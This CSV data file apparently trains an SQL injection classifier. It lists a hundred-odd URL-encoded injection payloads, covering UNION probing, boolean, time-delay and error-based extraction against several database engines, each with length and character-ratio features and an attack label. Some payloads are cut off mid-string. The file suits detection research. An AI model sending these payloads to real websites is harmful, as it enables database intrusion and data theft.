payload,payload_len,alpha,non_alpha,attack_feature,label
1%27%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,67,82.08955223880598,17.91044776119403,60000.0,1
-3782%25%22%29%20or%20make_set%289354%3D9354%2C7185%29%20and%20%28%22%25%22%3D%22,47,68.08510638297872,31.914893617021278,60000.0,1
-3964%22%29%20where%203566%3D3566%20order%20by%201--,36,83.33333333333334,16.666666666666664,60000.0,1
1%27%7C%7C%28select%20%27ybfo%27%20from%20dual%20where%203319%3D3319%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,102,85.29411764705883,14.705882352941178,120000.0,1
1%25%27%3Bbegin%20user_lock.sleep%285%29%3B%20end%20and%20%27%25%27%3D%27,43,69.76744186046511,30.23255813953488,30000.0,1
1%27%29%29%29%20or%207552%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%20and%20%28%28%28%27nqam%27%3D%27nqam,130,81.53846153846153,18.461538461538463,90000.0,1
-9534%25%27%20or%203038%3D3038,20,80.0,20.0,30000.0,1
1%27%2B%28select%20shec%20where%203589%3D3589%20and%206969%3D%28select%206969%20from%20pg_sleep%285%29%29%29%2B%27,74,82.43243243243244,17.56756756756757,90000.0,1
1%25%27%29%29%29%20waitfor%20delay%20%270%3A0%3A5%27--,30,63.33333333333333,36.666666666666664,30000.0,1
-1401%22%29%29%20union%20all%20select%203480%2C3480%2C3480%2C3480%2C3480%2C3480--,57,80.7017543859649,19.298245614035086,60000.0,1
1%25%27%29%29%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5--,93,79.56989247311827,20.43010752688172,30000.0,1
1%27%20waitfor%20delay%20%270%3A0%3A5%27%20and%20%27vwuz%27%3D%27vwuz,41,78.04878048780488,21.951219512195124,60000.0,1
-4473%27%29%20union%20all%20select%207656%2C7656%23,35,85.71428571428571,14.285714285714285,60000.0,1
-8515%27%20or%201329%3D9536,19,84.21052631578947,15.789473684210526,30000.0,1
1%27%29%20where%202763%3D2763%3B%28select%20%2A%20from%20%28select%28sleep%285%29%29%29srmq%29--,60,75.0,25.0,60000.0,1
1%25%22%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull--,47,82.97872340425532,17.02127659574468,60000.0,1
1%20and%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%283484%3D3484%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29,157,82.80254777070064,17.197452229299362,60000.0,1
1%22%20where%207232%3D7232%20%28select%20%28case%20when%20%285451%3D5451%29%20then%20regexp_substring%28repeat%28right%28char%285451%29%2C0%29%2C500000000%29%2Cnull%29%20else%20char%28108%29%7C%7Cchar%2876%29%7C%7Cchar%28112%29%7C%7Cchar%28116%29%20end%29%20from%20information_schema.system_users%29--,207,80.67632850241546,19.32367149758454,60000.0,1
-1344%29%20as%20gqgi%20where%202545%3D2545%20or%204144%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284144%3D4144%,263,45.247148288973385,15.209125475285171,69000.0,1
1%27%29%29%29%20and%206537%3Ddbms_pipe.receive_message%28chr%2876%29%7C%7Cchr%28116%29%7C%7Cchr%28117%29%7C%7Cchr%2865%29%2C5%29%20and%20%28%28%28%27cimm%27%20like%20%27cimm,105,70.47619047619048,29.523809523809526,90000.0,1
1%22%29%20as%20ikdo%20where%204128%3D4128%3Bbegin%20user_lock.sleep%285%29%3B%20end--,59,81.35593220338984,18.64406779661017,30000.0,1
1%25%22%29%29%29%20and%203116%3D9088%23,21,66.66666666666666,33.33333333333333,30000.0,1
1%27%20where%201628%3D1628%3Biif%289342%3D6508%2C1%2C1/0%29,39,76.92307692307693,23.076923076923077,30000.0,1
1%22%29%20where%208407%3D8407%20and%209254%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29--,127,85.8267716535433,14.173228346456693,90000.0,1
1%27%2B%28select%20%27leok%27%20where%204320%3D4320%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,94,77.6595744680851,22.340425531914892,39000.0,1
1%27%20and%203707%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29%20and%20%27rtbm%27%3D%27rtbm,120,86.66666666666667,13.333333333333334,90000.0,1
1%25%27%3Bselect%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3--,88,85.22727272727273,14.772727272727273,30000.0,1
1%29%20as%20caoa%20where%206139%3D6139%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,85,87.05882352941177,12.941176470588237,90000.0,1
-3729%27%29%29%20or%205023%3Dctxsys.drithsx.sn%285023%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%285023%3D5023%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28,222,52.702702702702695,18.01801801801802,60000.0,1
-1021%29%20as%20erjh%20where%207845%3D7845%20or%204747%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284747%3D4747%29%20then%201%20else%200%20en,234,56.41025641025641,14.957264957264957,60000.0,1
-9557%29%20where%202891%3D2891%20union%20all%20select%202891%2C2891%2C2891%2C2891%2C2891%2C2891%2C2891%2C2891%2C2891--,86,84.88372093023256,15.11627906976744,90000.0,1
1%29%20where%205464%3D5464%20or%201022%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,116,83.62068965517241,16.379310344827587,90000.0,1
1%27%29%20waitfor%20delay%20%270%3A0%3A5%27--,27,70.37037037037037,29.629629629629626,30000.0,1
-5196%22%29%29%29%20or%205023%3Dctxsys.drithsx.sn%285023%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%285023%3D5023%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr,229,51.09170305676856,17.46724890829694,60000.0,1
1%29%29%29%20and%20char%28111%29%7C%7Cchar%2877%29%7C%7Cchar%28121%29%7C%7Cchar%2888%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%28%282997%3D2997,160,71.25,28.749999999999996,60000.0,1
-7561%29%20as%20ilrm%20where%208828%3D8828%20or%205903%3D%28%27qqpjq%27%7C%7C%28select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29--,125,84.8,15.2,90000.0,1
-7979%27%2B%28select%20%27bkvt%27%20where%203613%3D3613%20union%20all%20select%203613%23,60,86.66666666666667,13.333333333333334,90000.0,1
1%27%29%20and%20sleep%285%29%23,17,70.58823529411765,29.411764705882355,30000.0,1
-7941%20or%20%285822%3D8754%29%2A8754--%20eepn,32,78.125,21.875,30000.0,1
1%27%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20and%20%27vhvh%27%3D%27vhvh,105,82.85714285714286,17.142857142857142,60000.0,1
1%27%7C%7C%28select%20%27fmss%27%20from%20dual%20where%207025%3D7025%20or%208421%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%29%7C%7C%27,106,80.18867924528303,19.81132075471698,120000.0,1
1%27%29%29%20as%20zqeg%20where%204729%3D4729%20and%20%281098%3D9682%29%2A9682--,51,80.3921568627451,19.607843137254903,60000.0,1
-6017%20union%20all%20select%208449%2C8449%2C8449--,39,87.17948717948718,12.82051282051282,60000.0,1
1%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,62,75.80645161290323,24.193548387096776,9000.0,1
1%22%29%29%29%20or%20row%281045%2C7562%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%281045%3D1045%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%208488%20union%20select%205584%20union%20select%203051%20union%20select%201210%29a%20group%20by%20x%29%20and%20%28%28%28%22hbgr%22%20like%20%22hbgr,231,82.68398268398268,17.316017316017316,300000.0,1
1%22%20where%208727%3D8727%3Bwaitfor%20delay%20%270%3A0%3A5%27--,42,78.57142857142857,21.428571428571427,60000.0,1
1%20where%208390%3D8390%20and%203824%3Dbenchmark%285000000%2Cmd5%280x76555642%29%29--,63,85.71428571428571,14.285714285714285,60000.0,1
1%22%29%29%20as%20qqhm%20where%207182%3D7182%3Bif%287899%3D7899%29%20select%207899%20else%20drop%20function%20zbbp--,80,87.5,12.5,90000.0,1
-4031%22%29%29%29%20or%201570%3Dconvert%28int%2C%28select%20char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%281570%3D1570%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113,224,55.35714285714286,16.517857142857142,30000.0,1
1%25%22%29%20or%206979%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,66,72.72727272727273,27.27272727272727,39000.0,1
1%27%29%29%20and%203824%3Dbenchmark%285000000%2Cmd5%280x76555642%29%29%20and%20%28%28%27inrm%27%20like%20%27inrm,72,80.55555555555556,19.444444444444446,90000.0,1
1%25%27%29%29%20procedure%20analyse%28extractvalue%289255%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x52515a50%29%29%29%29%29%2C1%29%20and%20%28%28%27%25%27%3D%27,107,74.76635514018692,25.233644859813083,30000.0,1
1%25%27%20or%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%288113%3D8113%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29%20and%20%27%25%27%3D%27,168,79.76190476190477,20.238095238095237,90000.0,1
1%27%7C%7C%28select%20%27fqoz%27%20where%209794%3D9794%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull--,78,83.33333333333334,16.666666666666664,90000.0,1
1%27%7C%7C%28select%20%27odud%27%20from%20dual%20where%202468%3D2468%20or%202367%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29--,151,85.43046357615894,14.56953642384106,120000.0,1
1%22%29%20as%20ifgl%20where%202190%3D2190%20rlike%20%28select%20%28case%20when%20%287689%3D7689%29%20then%201%20else%200x28%20end%29%29--,89,86.51685393258427,13.48314606741573,30000.0,1
1%27%7C%7C%28select%20%27mwpd%27%20where%202887%3D2887%3Bselect%20%28case%20when%20%284666%3D4666%29%20then%201%20else%204666%2A%28select%204666%20from%20master..sysdatabases%29%20end%29--,128,84.375,15.625,60000.0,1
-6636%27%29%29%29%20or%20elt%281032%3D1032%2C3623%29%20and%20%28%28%28%27kgip%27%3D%27kgip,52,69.23076923076923,30.76923076923077,60000.0,1
1%27%29%20and%202853%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%282853%3D2853%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20as%20numeric%29,190,69.47368421052632,30.526315789473685,30000.0,1
1%25%27%29%20and%208407%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%20and%20%28%27%25%27%3D%27,74,74.32432432432432,25.675675675675674,90000.0,1
1%22%29%29%20or%20char%2868%29%7C%7Cchar%2869%29%7C%7Cchar%2897%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%285389%29%2C0%29%2C5000000000%29%2Cnull%29%20and%20%28%28%22onhh%22%3D%22onhh,127,71.65354330708661,28.346456692913385,60000.0,1
1%27%29%29%29%20and%206991%3D5579,19,73.68421052631578,26.31578947368421,30000.0,1
1%27%2B%28select%20%27qpxk%27%20where%207139%3D7139%20procedure%20analyse%28extractvalue%289255%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x52515a50%29%29%29%29%29%2C1%29%29%2B%27,126,80.15873015873017,19.841269841269842,30000.0,1
1%27%29%20as%20akvn%20where%208669%3D8669%3Bselect%20%2A%20from%20generate_series%283990%2C3990%2Ccase%20when%20%283990%3D9597%29%20then%201%20else%200%20end%29%20limit%201--,118,87.28813559322035,12.711864406779661,60000.0,1
-6449%27%29%29%20or%202590%3D2848,21,76.19047619047619,23.809523809523807,30000.0,1
1%22%29%3Bselect%20pg_sleep%285%29%20and%20%28%22tpry%22%3D%22tpry,40,72.5,27.500000000000004,30000.0,1
1%27%29%29%20as%20xqam%20where%206750%3D6750%3Bselect%20%28case%20when%20%284205%3D9574%29%20then%204205%20else%201/%28select%200%29%20end%29--,93,83.87096774193549,16.129032258064516,30000.0,1
-4408%22%29%20or%206872%3D6872%20and%20%28%22oenu%22%3D%22oenu,38,76.31578947368422,23.684210526315788,60000.0,1
1%27%29%20and%202853%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%282853%3D2853%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20as%20numeric%29%20and%20%28%27mptm%27%3D%27mptm,208,69.71153846153845,30.288461538461537,60000.0,1
1%27%2B%28select%20nsri%20where%201202%3D1202%20and%204595%3D4595%23,46,86.95652173913044,13.043478260869565,60000.0,1
1%27%20procedure%20analyse%28extractvalue%289255%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x52515a50%29%29%29%29%29%2C1%29%20and%20%27hofy%27%20like%20%27hofy,114,82.45614035087719,17.543859649122805,60000.0,1
1%27%29%20or%20%28select%209173%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29%20and%20%28%27lwlh%27%3D%27lwlh,191,81.15183246073299,18.848167539267017,90000.0,1
1%27%29%29%29%3Bselect%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20and%20%28%28%28%27pnst%27%3D%27pnst,108,81.48148148148148,18.51851851851852,60000.0,1
-1714%27%20union%20all%20select%206687--,30,86.66666666666667,13.333333333333334,60000.0,1
1%22%20or%20char%2868%29%7C%7Cchar%2869%29%7C%7Cchar%2897%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%285389%29%2C0%29%2C5000000000%29%2Cnull%29%20and%20%22dtwv%22%20like%20%22dtwv,128,75.78125,24.21875,90000.0,1
1%25%22%29%20and%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29gcrr%29%23,48,72.91666666666666,27.083333333333332,60000.0,1
-6125%27%7C%7C%28select%20%27hwnm%27%20where%201428%3D1428%20union%20all%20select%201428%2C1428%2C1428%2C1428%2C1428%2C1428%23,86,83.72093023255815,16.27906976744186,90000.0,1
1%27%29%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5,89,83.14606741573034,16.853932584269664,30000.0,1
1%22%29%20and%206969%3D%28select%206969%20from%20pg_sleep%285%29%29%20and%20%28%22cjkk%22%20like%20%22cjkk,66,81.81818181818183,18.181818181818183,120000.0,1
-7032%27%29%20as%20xmmm%20where%205635%3D5635%20union%20all%20select%205635%2C5635%2C5635%2C5635%2C5635--,75,86.66666666666667,13.333333333333334,90000.0,1
1%29%20where%209149%3D9149%20and%20char%28120%29%7C%7Cchar%28106%29%7C%7Cchar%28117%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%289981%29%2C0%29%2C5000000000%29%2Cnull%29--,128,75.78125,24.21875,60000.0,1
1%3Bselect%20benchmark%285000000%2Cmd5%280x4c4d6142%29%29%23%20idxq,49,87.75510204081633,12.244897959183675,13.953488372093027,1
-2920%27%29%29%20or%202724%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%282724%3D2724%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%,207,57.00483091787439,18.84057971014493,30000.0,1
-4866%22%29%20as%20eyrq%20where%208365%3D8365%20or%201898%3D8320%23,45,86.66666666666667,13.333333333333334,60000.0,1
1%27%20or%20sleep%285%29,14,78.57142857142857,21.428571428571427,30000.0,1
1%25%27%29%29%29%3Bwaitfor%20delay%20%270%3A0%3A5%27%20and%20%28%28%28%27%25%27%3D%27,41,56.09756097560976,43.90243902439025,60000.0,1
-7941%25%27%29%20union%20all%20select%206965%2C6965%2C6965%2C6965--,47,80.85106382978722,19.148936170212767,60000.0,1
1%27%29%20as%20fksm%20where%209714%3D9714%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3--,119,88.23529411764706,11.76470588235294,60000.0,1
-6546%22%29%20order%20by%201%23,19,78.94736842105263,21.052631578947366,30000.0,1
1%27%29%29%29%20and%208189%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29--,108,84.25925925925925,15.74074074074074,60000.0,1
1%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,65,84.61538461538461,15.384615384615385,60000.0,1
1%3Bbegin%20dbms_lock.sleep%285%29%3B%20end--%20elvi,38,89.47368421052632,10.526315789473685,11.764705882352942,1
1%22%20or%20extractvalue%281297%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%281297%3D1297%2C1%29%29%29%2C0x717a767a71%29%29%20and%20%22ymwb%22%3D%22ymwb,108,80.55555555555556,19.444444444444446,60000.0,1
1%20and%20char%28111%29%7C%7Cchar%2877%29%7C%7Cchar%28121%29%7C%7Cchar%2888%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--%20zimf,147,72.10884353741497,27.89115646258503,30000.0,1
1%22%20and%20sleep%285%29%20and%20%22tdid%22%20like%20%22tdid,37,83.78378378378379,16.216216216216218,90000.0,1
1%27%29%3Bselect%20%28case%20when%20%285423%3D7706%29%20then%205423%20else%20cast%281%20as%20int%29/%28select%200%20from%20dual%29%20end%29%20from%20dual--,101,85.14851485148515,14.85148514851485,60000.0,1
-6561%22%29%29%29%20or%206872%3D6872%20and%20%28%28%28%22azqp%22%20like%20%22azqp,47,74.46808510638297,25.53191489361702,90000.0,1
1%22%29%20as%20ssbz%20where%208885%3D8885%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,91,85.71428571428571,14.285714285714285,90000.0,1
1%27%29%20as%20xrap%20where%205523%3D5523%20rlike%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29vwyq%29%23,73,82.1917808219178,17.80821917808219,60000.0,1
-8673%22%29%20or%20make_set%289354%3D9354%2C7185%29%20and%20%28%22edap%22%20like%20%22edap,58,79.3103448275862,20.689655172413794,90000.0,1
1%25%22%29%29%29%20or%208466%3Dbenchmark%285000000%2Cmd5%280x694a4745%29%29%20and%20%28%28%28%22%25%22%3D%22,62,69.35483870967742,30.64516129032258,60000.0,1
1%27%7C%7C%28select%20%27cclo%27%20from%20dual%20where%206823%3D6823%20and%209198%3D9198--,60,83.33333333333334,16.666666666666664,90000.0,1
-8136%27%29%20union%20all%20select%201324%2C1324%2C1324%2C1324%23,45,84.44444444444444,15.555555555555555,60000.0,1
-3988%27%29%29%20union%20all%20select%201113%23,31,83.87096774193549,16.129032258064516,60000.0,1
1%27%20and%203824%3Dbenchmark%285000000%2Cmd5%280x76555642%29%29%20and%20%27hmqq%27%3D%27hmqq,63,82.53968253968253,17.46031746031746,60000.0,1
1%25%27%29%20and%204061%3D2730%23,19,73.68421052631578,26.31578947368421,30000.0,1
1%27%20in%20boolean%20mode%29%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5--,107,84.11214953271028,15.887850467289718,30000.0,1
-5529%22%20or%205903%3D%28%27qqpjq%27%7C%7C%28select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29,99,83.83838383838383,16.161616161616163,60000.0,1
1%20where%205466%3D5466%20and%202388%3Dbenchmark%285000000%2Cmd5%280x6d457153%29%29%23,62,87.09677419354838,12.903225806451612,60000.0,1
1%27%29%20and%20make_set%284551%3D6487%2C6487%29%20and%20%28%27jnqa%27%3D%27jnqa,50,76.0,24.0,60000.0,1
1%29%20as%20qeav%20where%208127%3D8127%20and%204241%3Dconvert%28int%2C%28select%20char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%284241%3D4241%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29--,224,77.23214285714286,22.767857142857142,60000.0,1
-8523%29%20as%20hzqs%20where%208944%3D8944%20order%20by%201--,43,88.37209302325581,11.627906976744185,60000.0,1
1%27%29%20and%20make_set%286488%3D5525%2C5525%29,32,78.125,21.875,30000.0,1
1%22%29%29%20procedure%20analyse%28extractvalue%285840%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28case%20when%20%285840%3D5840%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%29%29%2C1%29%20and%20%28%28%22jzbb%22%3D%22jzbb,153,82.35294117647058,17.647058823529413,30000.0,1
1%25%22%29%29%20and%203580%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,101,83.16831683168317,16.831683168316832,60000.0,1
1%25%22%29%29%3Bselect%20dbms_pipe.receive_message%28chr%28112%29%7C%7Cchr%2870%29%7C%7Cchr%28106%29%7C%7Cchr%2878%29%2C5%29%20from%20dual--,90,70.0,30.0,30000.0,1
